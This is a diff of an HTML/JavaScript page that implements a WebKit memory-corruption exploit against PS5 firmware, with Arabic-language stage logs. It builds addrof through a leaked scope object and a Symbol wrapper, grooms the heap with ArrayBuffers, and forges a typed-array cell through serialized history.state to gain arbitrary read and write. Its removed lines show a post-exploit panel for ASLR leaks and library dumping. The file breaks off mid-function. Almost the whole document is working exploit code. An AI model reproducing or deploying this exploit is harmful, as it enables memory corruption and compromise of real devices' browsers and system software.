@@ -1,1156 +1,613 @@
 <!doctype html>
-<!--
-  PS5 FW 11.60 / WebKit 616.1 genuine-view R/W bootstrap.
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>PS5 13.42 — ARW → Info Leak</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: "SF Mono", "Cascadia Mono", "Fira Code", monospace;
+    background: #0d1117;
+    color: #c9d1d9;
+    padding: 20px;
+    line-height: 1.7;
+  }
+  #banner {
+    background: linear-gradient(90deg, #161b22, #21262d);
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin-bottom: 18px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  #banner .logo { font-size: 28px; }
+  #banner h1 { font-size: 16px; color: #58a6ff; letter-spacing: 0.5px; }
+  #banner .sub { font-size: 11px; color: #8b949e; margin-top: 2px; }
 
-  A six-inline-property JSFinalObject supplies exactly 0x30 controlled bytes at
-  addrof(host)+0x10.  The fake header uses the VM-bootstrap String StructureID
-  0x4250 (third Structure allocated by VM::VM) with Uint8Array's inline type.
-  q1 is zero, so concurrent GC dispatch through the String visitor is inert.
-  q2 is a genuine Uint8Array over an explicit ArrayBuffer. The fake first reads
-  that cell, then upgrades its own header to the genuine Uint8Array StructureID.
+  .stage-box {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin-bottom: 14px;
+    position: relative;
+    overflow: hidden;
+  }
+  .stage-box::before {
+    content: "";
+    position: absolute;
+    top: 0; right: 0; width: 4px; height: 100%;
+    background: #30363d;
+  }
+  .stage-box.active::before { background: #58a6ff; }
+  .stage-box.ok::before    { background: #238636; }
+  .stage-box.fail::before  { background: #da3633; }
+  .stage-box.warn::before  { background: #d29922; }
 
-  The fake byte-writes only the genuine view's m_vector. The genuine view reads a
-  second Uint8Array cell, follows its backing pointer, changes A5 -> 5A -> A5,
-  and is restored to its original backing before the fake value is released.
-  Both genuine views use WastefulTypedArray mode 0x58, whose GC visitor retains
-  the ArrayBuffer through the butterfly and never marks m_vector.
+  .stage-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: #f0f6fc;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
 
-  This permits at most ten ordinary refresh attempts because allocator misses
-  return a clean deserialization TypeError. A confirmed pass blocks later runs.
--->
-<meta charset="utf-8"><title>genuine-u8-rw-1160</title>
-<body style="font:13px monospace"><pre id="out"></pre>
-    <!-- ========================================== -->
-<!-- Post-Exploit Control Panel (User Interface) -->
-<!-- ========================================== -->
-<div id="ps5-panel" style="display:none; position:fixed; top:20px; right:20px; background:#111; padding:20px; border:2px solid #0f0; z-index:9999; border-radius:8px; box-shadow:0 0 15px rgba(0,255,0,0.5);">
-    <h3 style="color:#0f0; margin:0 0 15px 0; font-family:sans-serif; text-align:center;">🎯 PS5 FW 13.42 Post-Exploit</h3>
-    <button id="btn-arw" onclick="setupARW()" style="display:block; width:100%; margin:8px 0; padding:12px; background:#0f0; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:4px;">1. تفعيل أدوات R/W (Primitives)</button>
-    <button id="btn-aslr" onclick="leakASLR()" style="display:block; width:100%; margin:8px 0; padding:12px; background:#0af; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:4px;" disabled>2. تسريب ASLR (WebKit Base)</button>
-    <button id="btn-dump" onclick="dumpLibrary()" style="display:block; width:100%; margin:8px 0; padding:12px; background:#f0a; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:4px;" disabled>3. تفريغ المكتبة (Dump .sprx)</button>
-    
-    <div id="panel-log" style="color:#fff; font-family:monospace; font-size:12px; margin-top:15px; max-height:250px; overflow-y:scroll; background:#000; padding:10px; border:1px solid #333; border-radius:4px; white-space:pre-wrap;"></div>
+  .log-line {
+    font-size: 12px;
+    padding: 3px 0;
+    border-bottom: 1px solid #21262d;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .log-line:last-child { border-bottom: none; }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 8px;
+    border-radius: 10px;
+    font-size: 10px;
+    font-weight: 700;
+    white-space: nowrap;
+  }
+  .badge.ok  { background: #23863622; color: #3fb950; border: 1px solid #23863644; }
+  .badge.fail{ background: #da363322; color: #f85149; border: 1px solid #da363344; }
+  .badge.info{ background: #58a6ff22; color: #58a6ff; border: 1px solid #58a6ff44; }
+  .badge.warn{ background: #d2992222; color: #e3b341; border: 1px solid #d2992244; }
+
+  .hex { color: #a5d6ff; font-weight: 700; }
+  .num { color: #79c0ff; }
+  .addr { color: #d2a8ff; font-weight: 700; }
+
+  #out { margin-top: 10px; }
+
+  .spinner {
+    display: inline-block;
+    width: 10px; height: 10px;
+    border: 2px solid #58a6ff44;
+    border-top-color: #58a6ff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div id="banner">
+  <div class="logo">🎯</div>
+  <div>
+    <h1>PS5 FW 13.42 — ARW → Info Leak</h1>
+    <div class="sub">Stage 0: Bootstrap  &nbsp;|&nbsp;  Stage 1: libkernel Leak</div>
+  </div>
 </div>
+
+<div class="stage-box active" id="box-s0">
+  <div class="stage-title">📦 Stage 0 — ARW Bootstrap</div>
+  <div id="out-s0"></div>
+</div>
+
+<div class="stage-box" id="box-s1">
+  <div class="stage-title">🔍 Stage 1 — Info Leak</div>
+  <div id="out-s1"></div>
+</div>
+
+<div class="stage-box" id="box-summary">
+  <div class="stage-title">📋 ملخص النتائج</div>
+  <div id="out-summary"></div>
+</div>
+
 <script>
 "use strict";
 
+// ═══════════════════════════════════════════════════════════════════
+//  Helpers
+// ═══════════════════════════════════════════════════════════════════
+function $(id){ return document.getElementById(id); }
+
+function log(stage, icon, text, badgeType, badgeText){
+  var box = $("out-" + stage);
+  var line = document.createElement("div");
+  line.className = "log-line";
+  var badge = badgeType
+    ? '<span class="badge ' + badgeType + '">' + icon + " " + badgeText + '</span>'
+    : '<span style="width:22px;text-align:center;display:inline-block">' + icon + '</span>';
+  line.innerHTML = badge + "<span>" + text + "</span>";
+  box.appendChild(line);
+  box.scrollTop = box.scrollHeight;
+}
+
+function setBox(id, cls){
+  $("box-" + id).classList.remove("active","ok","fail","warn");
+  $("box-" + id).classList.add(cls);
+}
+
+function hex(v){
+  if(typeof v === "bigint") return "0x" + v.toString(16);
+  return "0x" + v.toString(16);
+}
+
+function num(n){ return '<span class="num">' + n + '</span>'; }
+function addr(a){ return '<span class="addr">' + hex(a) + '</span>'; }
+
+// ═══════════════════════════════════════════════════════════════════
+//  Config
+// ═══════════════════════════════════════════════════════════════════
 var Q = new URLSearchParams(location.search);
-var requestedDrain = parseInt(Q.get("n") || "512", 10);
-var DRAIN_COUNT = isFinite(requestedDrain)
-    ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
+var DRAIN_COUNT = parseInt(Q.get("n") || "512", 10);
+if(!isFinite(DRAIN_COUNT)) DRAIN_COUNT = 512;
+DRAIN_COUNT = Math.max(64, Math.min(1024, DRAIN_COUNT));
 
-var REVISION = "genuine-u8-rw-3";
-var MAX_ATTEMPTS = 10;
-var attemptNumber = 0;
-var K = 2;
-var DUPLICATE_INDEX = 2;
-var CONTROL_INDEX = 0xffff;
-var CONTROL_INT = -64000;
-var FILLER_BIGINTS = K - 1;
-var FILLER_OBJECTS = 0xfffe - K;
-var EXPECTED_LENGTH = 0x50001;
-var CELL_BYTES = 0x30;
+var K=2, DUPLICATE_INDEX=2, CONTROL_INDEX=0xffff;
+var CONTROL_INT=-64000, FILLER_BIGINTS=K-1;
+var FILLER_OBJECTS=0xfffe-K, EXPECTED_LENGTH=0x50001, CELL_BYTES=0x30;
+var CARRIER_SLOTS=9000000, CAPTURE_DELAY_MS=3000, COMPOSE_DELAY_MS=6500;
+var DRAIN_SIZE=0x10000, SLAB_SIZE=0x400000;
+var BUTTERFLY_HOLE_SIZE=0x81000, SEPARATOR_SIZE=0x10000;
+var EARLY_HOLE_SIZE=0x70000, GUARD_SIZE=0x90000;
+var PREDECESSOR_SIZE=0x80000, FINAL_HOLE_SIZE=0x80000;
 
-var CARRIER_SLOTS = 9000000;
-var CARRIER_BYTES = CARRIER_SLOTS * 8;
-var CAPTURE_DELAY_MS = 3000;
-var COMPOSE_DELAY_MS = 6500;
-var symbolToString = Symbol.prototype.toString;
+// ═══════════════════════════════════════════════════════════════════
+//  Globals
+// ═══════════════════════════════════════════════════════════════════
+var gCandidate=null, gRWView=null, gRWOriginalVector=0;
+var rwBuffer, rwView, rwMirror, targetBuffer, targetView, fakeHost, lengthWord;
+var fillerGraph, outerGraph, referenceTarget;
+var leakedScope, getterCarrier, preparedSymbolObject;
+var capturedString, capturedWords, copiedLength=0;
+var captureState=0, captureError=null;
+var hostAddress=NaN, fakeAddress=NaN;
+var keepAlive=new Array(DRAIN_COUNT+3), keepIndex=0;
+var predecessorWords=null;
+var targetAddress=NaN, targetAddressLow=0, targetAddressHigh=0;
+var rwHeader=new Uint8Array(CELL_BYTES);
+var targetHeader=new Uint8Array(CELL_BYTES);
+var scratchBits=new ArrayBuffer(8);
+var scratchBytes=new Uint8Array(scratchBits);
+var scratchWords=new Uint32Array(scratchBits);
+var scratchDouble=new Float64Array(scratchBits);
+var rwOriginalVector=NaN, targetVector=NaN;
+var rwHeaderOK=false, targetHeaderOK=false;
+var readObserved=false, writeObserved=false, restoreObserved=false;
+var compositionState=0;
 
-var DRAIN_SIZE = 0x10000;
-var SLAB_SIZE = 0x400000;
-var BUTTERFLY_HOLE_SIZE = 0x81000;
-var SEPARATOR_SIZE = 0x10000;
-var EARLY_HOLE_SIZE = 0x70000;
-var GUARD_SIZE = 0x90000;
-var PREDECESSOR_SIZE = 0x80000;
-var FINAL_HOLE_SIZE = 0x80000;
+// ═══════════════════════════════════════════════════════════════════
+//  Bootstrap (identical to working PoC)
+// ═══════════════════════════════════════════════════════════════════
+function buf(s){ return new ArrayBuffer(s); }
 
-var seq = 0;
-var referenceTarget = null;
-var rwBuffer = null;
-var rwView = null;
-var rwMirror = null;
-var targetBuffer = null;
-var targetView = null;
-var fakeHost = null;
-var lengthWord = null;
-var fillerGraph = null;
-var outerGraph = null;
-
-// Keep all addrof allocations rooted. Releasing the 72 MB butterfly before the
-// clone getter would perturb the classic-bmalloc layout inherited from /r.
-var leakedScope = null;
-var getterCarrier = null;
-var preparedSymbolObject = null;
-var capturedString = null;
-var capturedWords = null;
-var copiedLength = 0;
-var captureState = 0;
-var captureError = null;
-var hostAddress = NaN;
-var fakeAddress = NaN;
-
-var keepAlive = new Array(DRAIN_COUNT + 3);
-var keepIndex = 0;
-var predecessorWords = null;
-var pointerLow = 0;
-var pointerHigh = 0;
-var targetAddress = NaN;
-var targetAddressLow = 0;
-var targetAddressHigh = 0;
-
-var rwHeader = new Uint8Array(CELL_BYTES);
-var targetHeader = new Uint8Array(CELL_BYTES);
-var scratchBits = new ArrayBuffer(8);
-var scratchBytes = new Uint8Array(scratchBits);
-var scratchWords = new Uint32Array(scratchBits);
-var scratchDouble = new Float64Array(scratchBits);
-
-var rwOriginalVector = NaN;
-var targetVector = NaN;
-var rwHeaderOK = false;
-var targetHeaderOK = false;
-var readObserved = false;
-var writeObserved = false;
-var restoreObserved = false;
-var retrySafe = false;
-
-var compositionState = 0; // 1=R/W completed, 2=normal miss, 3=header mismatch, -1=throw
-var compositionLength = 0;
-var compositionError = null;
-
-function mark(tag, extra) {
-    seq++;
-    var line = seq + "-rw-" + tag
-        + (extra !== undefined ? "-" + extra : "");
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "/log/" + encodeURIComponent(line), false);
-        xhr.send();
-    } catch (_) {}
-    try { document.getElementById("out").textContent += line + "\n"; } catch (_) {}
+function leakScopeObject(){
+  class Leaker{ leak(){ return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({},{
+    get:function(t,p,r){ return r; }
+  });
+  var leak = Leaker.prototype.leak;
+  return (function(){ return leak(); })();
 }
 
-function hex(value) {
-    return "0x" + value.toString(16);
+function prepareSymbolWrapper(F){
+  leakedScope = leakScopeObject();
+  if(!leakedScope) throw new Error("scope-not-leaked");
+  for(var i=0;i<512;i++) leakedScope["p"+i]=i;
+  for(var j=0;j<8;j++) leakedScope[j]=1.1*j;
+  Object.defineProperty(leakedScope,"g",{get:F,configurable:true});
+  return Object(leakedScope.g);
 }
 
-function buffer(size) {
-    return new ArrayBuffer(size);
+function pointerFromWords(words,offset){
+  if(words[offset+3]!==0) return NaN;
+  return words[offset]+words[offset+1]*0x10000+words[offset+2]*0x100000000;
 }
 
-function leakScopeObject() {
-    class Leaker { leak() { return super.foo; } }
-    Leaker.prototype.__proto__ = new Proxy({}, {
-        get: function (target, property, receiver) { return receiver; }
-    });
-    var leak = Leaker.prototype.leak;
-    return (function () { return leak(); })();
+function plausibleCell(value){
+  return value>0x100000000 && value<=0xffffffffffff && value<=9007199254740991
+    && Math.floor(value)===value && value%8===0;
 }
 
-function prepareSymbolWrapper(F) {
-    leakedScope = leakScopeObject();
-    if (leakedScope === undefined || leakedScope === null)
-        throw new Error("scope-not-leaked");
-
-    for (var i = 0; i < 512; i++)
-        leakedScope["p" + i] = i;
-    for (var j = 0; j < 8; j++)
-        leakedScope[j] = 1.1 * j;
-
-    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
-    return Object(leakedScope.g);
+function encodedHeaderNumber(){
+  var raw=new ArrayBuffer(8), u32=new Uint32Array(raw), f64=new Float64Array(raw);
+  u32[0]=0x00004250; u32[1]=0x01062800;
+  return f64[0];
 }
 
-function pointerFromWords(words, offset) {
-    if (words[offset + 3] !== 0)
-        return NaN;
-    return words[offset]
-        + words[offset + 1] * 0x10000
-        + words[offset + 2] * 0x100000000;
+function buildFakeHost(){
+  rwBuffer=new ArrayBuffer(0x100);
+  rwView=new Uint8Array(rwBuffer);
+  rwMirror=new Uint8Array(rwBuffer);
+  rwMirror[0]=0x3c;
+  targetBuffer=new ArrayBuffer(0x20);
+  targetView=new Uint8Array(targetBuffer);
+  targetView[0]=0xa5;
+  lengthWord={keep:0x51515151};
+  fakeHost={q0:encodedHeaderNumber(),q1:1.1,q2:rwView,q3:lengthWord,q4:2.2,q5:3.3};
+  delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;
+  if(!isFinite(fakeHost.q0)||fakeHost.q2!==rwView||fakeHost.q3!==lengthWord||rwView[0]!==0x3c||targetView[0]!==0xa5)
+    throw new Error("fake-host-shape-failed");
 }
 
-function plausibleCell(value) {
-    return value > 0x100000000
-        && value <= 0xffffffffffff
-        && value <= 9007199254740991
-        && Math.floor(value) === value
-        && value % 8 === 0;
+function buildAndStoreGraph(){
+  referenceTarget={marker:0x51515151,kind:"serialized-reference"};
+  buildFakeHost();
+  log("s0","📦","بناء SSV graph — k="+num(K)+", n="+num(DRAIN_COUNT),"info","INFO");
+  fillerGraph=new Array(0xfffd);
+  var pos=0;
+  var huge=1n<<40n;
+  for(var b=0;b<FILLER_BIGINTS;++b) fillerGraph[pos++]=huge+BigInt(b);
+  for(var o=0;o<FILLER_OBJECTS;++o) fillerGraph[pos++]={};
+  outerGraph=new Array(CONTROL_INDEX+1);
+  outerGraph[0]=fillerGraph;
+  outerGraph[1]=referenceTarget;
+  outerGraph[2]=referenceTarget;
+  outerGraph[CONTROL_INDEX]=CONTROL_INT;
+  history.replaceState(outerGraph,"");
+  log("s0","✓","SSV stored في history.state","ok","OK");
 }
 
-function encodedHeaderNumber() {
-    // Desired stored JSValue qword: 0x0108280000004250.
-    // JSVALUE64 stores a finite double by adding DoubleEncodeOffset (1<<49),
-    // hence the IEEE input qword is 0x0106280000004250.
-    var raw = new ArrayBuffer(8);
-    var u32 = new Uint32Array(raw);
-    var f64 = new Float64Array(raw);
-    u32[0] = 0x00004250;
-    u32[1] = 0x01062800;
-    return f64[0];
+function prepareAddrof(){
+  capturedWords=new Uint16Array(16);
+  getterCarrier=function(){return 7;};
+  log("s0","🔧","تحضير Symbol wrapper — carrier slots: "+num(CARRIER_SLOTS),"info","INFO");
+  getterCarrier[0]=fakeHost;
+  for(var i=1;i<CARRIER_SLOTS;i++) getterCarrier[i]=0;
+  getterCarrier[1]=targetView;
+  getterCarrier[2]=fakeHost;
+  getterCarrier[3]=targetView;
+  preparedSymbolObject=prepareSymbolWrapper(getterCarrier);
+  log("s0","⏳","انتظار capture... "+num(CAPTURE_DELAY_MS)+"ms","warn","WAIT");
+  setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+  setTimeout(beginComposition, COMPOSE_DELAY_MS);
 }
 
-function buildFakeHost() {
-    // Explicit ArrayBuffers force WastefulTypedArray mode (0x58). Its GC
-    // visitor retains the backing through the butterfly and ignores m_vector,
-    // which makes a short, reversible vector rewrite safe to validate.
-    rwBuffer = new ArrayBuffer(0x100);
-    rwView = new Uint8Array(rwBuffer);
-    rwMirror = new Uint8Array(rwBuffer);
-    rwMirror[0] = 0x3c;
-
-    targetBuffer = new ArrayBuffer(0x20);
-    targetView = new Uint8Array(targetBuffer);
-    targetView[0] = 0xa5;
-    lengthWord = { keep: 0x51515151 };
-
-    // Object-literal creation is important: six declared properties get the six
-    // inline slots. Adding six properties dynamically to {} may spill after two.
-    fakeHost = {
-        q0: encodedHeaderNumber(),
-        q1: 1.1,
-        q2: rwView,
-        q3: lengthWord,
-        q4: 2.2,
-        q5: 3.3
-    };
-
-    // Deleted inline properties become exact all-zero qwords.
-    delete fakeHost.q1; // fake butterfly
-    delete fakeHost.q4; // fake byteOffset
-    delete fakeHost.q5; // mode 0: non-resizable/raw-fields path; inert GC switch
-
-    if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
-        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
-        || targetView[0] !== 0xa5)
-        throw new Error("fake-host-shape-failed");
+function runAddrofCapture(){
+  try{
+    capturedString=Symbol.prototype.toString.call(preparedSymbolObject);
+    copiedLength=capturedString.length;
+    for(var i=0;i<16;i++) capturedWords[i]=capturedString.charCodeAt(7+i);
+    captureState=1;
+  }catch(e){ captureError=e; captureState=-1; }
 }
 
-function buildAndStoreGraph() {
-    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
-    buildFakeHost();
-
-    mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
-    fillerGraph = new Array(0xfffd);
-    var pos = 0;
-    var huge = 1n << 40n;
-    for (var b = 0; b < FILLER_BIGINTS; ++b)
-        fillerGraph[pos++] = huge + BigInt(b);
-    for (var o = 0; o < FILLER_OBJECTS; ++o)
-        fillerGraph[pos++] = {};
-
-    outerGraph = new Array(CONTROL_INDEX + 1);
-    outerGraph[0] = fillerGraph;
-    outerGraph[1] = referenceTarget;
-    outerGraph[2] = referenceTarget;
-    outerGraph[CONTROL_INDEX] = CONTROL_INT;
-    mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);
-
-    mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
-    history.replaceState(outerGraph, "");
-    mark("SSV-STORED", "fake-host-rw-target-not-serialized");
+function fillRawCellPointers(backing,pointer){
+  var ph=Math.floor(pointer/0x100000000);
+  var pl=pointer-ph*0x100000000;
+  if(!plausibleCell(pointer)||ph<0||ph>0xffff||pl<0||pl>0xffffffff||pl+ph*0x100000000!==pointer)
+    throw new Error("invalid-address");
+  predecessorWords=new Uint32Array(backing);
+  for(var i=0;i<predecessorWords.length;i+=2){
+    predecessorWords[i]=pl; predecessorWords[i+1]=ph;
+  }
 }
+function clearPredecessor(){ if(predecessorWords) predecessorWords.fill(0); }
 
-function prepareAddrof() {
-    capturedWords = new Uint16Array(16);
-    getterCarrier = function getterCarrierFunction() { return 7; };
-
-    mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
-    getterCarrier[0] = fakeHost;
-    for (var i = 1; i < CARRIER_SLOTS; i++)
-        getterCarrier[i] = 0;
-    getterCarrier[1] = targetView;
-    getterCarrier[2] = fakeHost;
-    getterCarrier[3] = targetView;
-    mark("ADDROF-CARRIER-DONE", "host-target-host-target");
-
-    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
-    mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
-
-    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
-    setTimeout(beginComposition, COMPOSE_DELAY_MS);
-}
-
-function runAddrofCapture() {
-    try {
-        capturedString = symbolToString.call(preparedSymbolObject);
-        copiedLength = capturedString.length;
-        for (var i = 0; i < 16; i++)
-            capturedWords[i] = capturedString.charCodeAt(7 + i);
-        captureState = 1;
-    } catch (error) {
-        captureError = error;
-        captureState = -1;
+function loadHistoryCritical(){
+  var result=null, candidate=null;
+  var rwHeaderCaptured=false, rwVectorTouched=false;
+  try{
+    result=history.state;
+    if(result.length!==EXPECTED_LENGTH){
+      result[DUPLICATE_INDEX]=undefined;
+      compositionState=3; return;
     }
-}
+    if(result[1]===result[DUPLICATE_INDEX]){
+      result[DUPLICATE_INDEX]=undefined;
+      compositionState=2; return;
+    }
+    candidate=result[DUPLICATE_INDEX];
+    result[DUPLICATE_INDEX]=undefined;
+    result=null;
 
-function fillRawCellPointers(backing, pointer) {
-    pointerHigh = Math.floor(pointer / 0x100000000);
-    pointerLow = pointer - pointerHigh * 0x100000000;
+    for(var i=0;i<CELL_BYTES;++i) rwHeader[i]=candidate[i];
+    rwHeaderCaptured=true;
 
-    if (!plausibleCell(pointer)
-        || pointerHigh < 0 || pointerHigh > 0xffff
-        || Math.floor(pointerLow) !== pointerLow
-        || pointerLow < 0 || pointerLow > 0xffffffff
-        || pointerLow + pointerHigh * 0x100000000 !== pointer)
-        throw new Error("invalid-low48-fake-address");
+    var rwSID=rwHeader[0]+rwHeader[1]*0x100+rwHeader[2]*0x10000+rwHeader[3]*0x1000000;
+    var rwHeaderHigh=rwHeader[4]+rwHeader[5]*0x100+rwHeader[6]*0x10000+rwHeader[7]*0x1000000;
+    var rwButterfly=rwHeader[8]+rwHeader[9]*0x100+rwHeader[10]*0x10000+rwHeader[11]*0x1000000
+      +rwHeader[12]*0x100000000+rwHeader[13]*0x10000000000;
+    var rwVectorLow=rwHeader[0x10]+rwHeader[0x11]*0x100+rwHeader[0x12]*0x10000+rwHeader[0x13]*0x1000000;
+    var rwVectorHigh=rwHeader[0x14]+rwHeader[0x15]*0x100;
+    rwOriginalVector=rwVectorLow+rwVectorHigh*0x100000000;
 
-    predecessorWords = new Uint32Array(backing);
-    for (var i = 0; i < predecessorWords.length; i += 2) {
-        predecessorWords[i] = pointerLow;
-        predecessorWords[i + 1] = pointerHigh;
+    var rwOffsetZero=true;
+    for(var rz=0x20;rz<0x28;++rz) if(rwHeader[rz]!==0) rwOffsetZero=false;
+
+    rwHeaderOK=rwSID>=0x4000&&rwSID<0x08000000&&(rwSID&0xf)===0
+      &&rwHeader[4]===0&&rwHeader[5]===0x28&&rwHeader[6]===0x08
+      &&(rwHeader[7]===0||rwHeader[7]===1)
+      &&rwHeader[0x0e]===0&&rwHeader[0x0f]===0
+      &&rwButterfly>0x100000000&&rwButterfly%8===0
+      &&rwHeader[0x16]===0&&rwHeader[0x17]===0
+      &&rwOriginalVector>0x100000000&&rwOriginalVector%8===0
+      &&rwHeader[0x18]===0&&rwHeader[0x19]===1
+      &&rwHeader[0x1a]===0&&rwHeader[0x1b]===0
+      &&rwHeader[0x1c]===0&&rwHeader[0x1d]===0
+      &&rwHeader[0x1e]===0&&rwHeader[0x1f]===0
+      &&rwOffsetZero&&rwHeader[0x28]===0x58;
+
+    if(!rwHeaderOK){ candidate=null; compositionState=3; return; }
+
+    scratchWords[0]=rwSID;
+    scratchWords[1]=(rwHeaderHigh-0x00020000)>>>0;
+    var upgradedHeader=scratchDouble[0];
+    if(!(upgradedHeader===upgradedHeader&&upgradedHeader!==Infinity&&upgradedHeader!==-Infinity)){
+      candidate=null; compositionState=3; return;
+    }
+    fakeHost.q0=upgradedHeader;
+    if(fakeHost.q0!==upgradedHeader){ candidate=null; compositionState=3; return; }
+
+    scratchWords[0]=targetAddressLow;
+    scratchWords[1]=targetAddressHigh;
+    rwVectorTouched=true;
+    for(var w1=0;w1<8;++w1) candidate[0x10+w1]=scratchBytes[w1];
+
+    for(var j=0;j<CELL_BYTES;++j) targetHeader[j]=rwView[j];
+
+    var targetSID=targetHeader[0]+targetHeader[1]*0x100+targetHeader[2]*0x10000+targetHeader[3]*0x1000000;
+    var targetButterfly=targetHeader[8]+targetHeader[9]*0x100+targetHeader[10]*0x10000+targetHeader[11]*0x1000000
+      +targetHeader[12]*0x100000000+targetHeader[13]*0x10000000000;
+    var targetVectorLow=targetHeader[0x10]+targetHeader[0x11]*0x100+targetHeader[0x12]*0x10000+targetHeader[0x13]*0x1000000;
+    var targetVectorHigh=targetHeader[0x14]+targetHeader[0x15]*0x100;
+    targetVector=targetVectorLow+targetVectorHigh*0x100000000;
+
+    var targetOffsetZero=true;
+    for(var tz=0x20;tz<0x28;++tz) if(targetHeader[tz]!==0) targetOffsetZero=false;
+
+    targetHeaderOK=targetSID===rwSID
+      &&targetHeader[4]===0&&targetHeader[5]===0x28&&targetHeader[6]===0x08
+      &&(targetHeader[7]===0||targetHeader[7]===1)
+      &&targetHeader[0x0e]===0&&targetHeader[0x0f]===0
+      &&targetButterfly>0x100000000&&targetButterfly%8===0
+      &&targetHeader[0x16]===0&&targetHeader[0x17]===0
+      &&targetVector>0x100000000&&targetVector%8===0
+      &&targetHeader[0x18]===0x20
+      &&targetHeader[0x19]===0&&targetHeader[0x1a]===0
+      &&targetHeader[0x1b]===0&&targetHeader[0x1c]===0
+      &&targetHeader[0x1d]===0&&targetHeader[0x1e]===0
+      &&targetHeader[0x1f]===0&&targetOffsetZero
+      &&targetHeader[0x28]===0x58;
+
+    if(!targetHeaderOK){
+      for(var r1=0;r1<8;++r1) candidate[0x10+r1]=rwHeader[0x10+r1];
+      candidate=null; compositionState=3; return;
     }
 
-    var last = predecessorWords.length - 2;
-    if (predecessorWords[0] !== pointerLow
-        || predecessorWords[1] !== pointerHigh
-        || predecessorWords[last] !== pointerLow
-        || predecessorWords[last + 1] !== pointerHigh)
-        throw new Error("pointer-fill-verification-failed");
+    scratchWords[0]=targetVectorLow;
+    scratchWords[1]=targetVectorHigh;
+    for(var w2=0;w2<8;++w2) candidate[0x10+w2]=scratchBytes[w2];
+
+    readObserved=rwView[0]===0xa5&&targetView[0]===0xa5;
+    if(!readObserved){
+      for(var rRead=0;rRead<8;++rRead) candidate[0x10+rRead]=rwHeader[0x10+rRead];
+      targetView[0]=0xa5; rwMirror[0]=0x3c;
+      candidate=null; compositionState=3; return;
+    }
+    rwView[0]=0x5a;
+    writeObserved=rwView[0]===0x5a&&targetView[0]===0x5a;
+    rwView[0]=0xa5;
+
+    for(var r2=0;r2<8;++r2) candidate[0x10+r2]=rwHeader[0x10+r2];
+    targetView[0]=0xa5; rwMirror[0]=0x3c;
+    restoreObserved=rwView[0]===0x3c&&rwMirror[0]===0x3c&&targetView[0]===0xa5;
+
+    gCandidate=candidate;
+    gRWView=rwView;
+    gRWOriginalVector=rwOriginalVector;
+    candidate=null;
+    clearPredecessor();
+    compositionState=1;
+  }catch(error){
+    if(candidate!==null&&rwHeaderCaptured&&rwVectorTouched){
+      try{ for(var rr=0;rr<8;++rr) candidate[0x10+rr]=rwHeader[0x10+rr]; }catch(_){}
+    }
+    candidate=null;
+    try{ targetView[0]=0xa5; }catch(_){}
+    try{ rwMirror[0]=0x3c; }catch(_){}
+    try{ clearPredecessor(); }catch(_){}
+    compositionState=-1;
+  }
 }
 
-function clearPredecessor() {
-    if (predecessorWords !== null)
-        predecessorWords.fill(0);
+function runGroomAndLoad(){
+  try{
+    log("s0","🔄","Grooming heap — n="+num(DRAIN_COUNT),"info","INFO");
+    var channel=new MessageChannel();
+    channel.port1.close(); channel.port2.close();
+    for(var i=0;i<DRAIN_COUNT;++i) keepAlive[keepIndex++]=buf(DRAIN_SIZE);
+    var slab=buf(SLAB_SIZE);
+    channel.port1.postMessage(0,[slab]);
+    slab=null;
+    var butterflyHole1=buf(BUTTERFLY_HOLE_SIZE);
+    var butterflyHole2=buf(BUTTERFLY_HOLE_SIZE);
+    var separator=buf(SEPARATOR_SIZE);
+    var earlyHole=buf(EARLY_HOLE_SIZE);
+    var guard=buf(GUARD_SIZE);
+    var predecessor=buf(PREDECESSOR_SIZE);
+    var finalHole=buf(FINAL_HOLE_SIZE);
+    fillRawCellPointers(predecessor,fakeAddress);
+    keepAlive[keepIndex++]=separator;
+    keepAlive[keepIndex++]=guard;
+    keepAlive[keepIndex++]=predecessor;
+    log("s0","📍","Predecessor filled — fake @ "+addr(fakeAddress),"info","INFO");
+    channel.port1.postMessage(0,[butterflyHole1,butterflyHole2,earlyHole,finalHole]);
+    loadHistoryCritical();
+  }catch(error){
+    try{ clearPredecessor(); }catch(_){}
+    compositionState=-1;
+  }
+
+  if(compositionState===1&&rwHeaderOK&&targetHeaderOK&&readObserved&&writeObserved&&restoreObserved){
+    setBox("s0","ok");
+    log("s0","✅","ARW مؤكد!","ok","PASS");
+    log("s0","💎","StructureID = "+num(rwHeader[0]+rwHeader[1]*0x100+rwHeader[2]*0x10000+rwHeader[3]*0x1000000),"ok","DATA");
+    log("s0","💎","RW Vector    = "+addr(rwOriginalVector),"ok","DATA");
+    log("s0","💎","Target Vector= "+addr(targetVector),"ok","DATA");
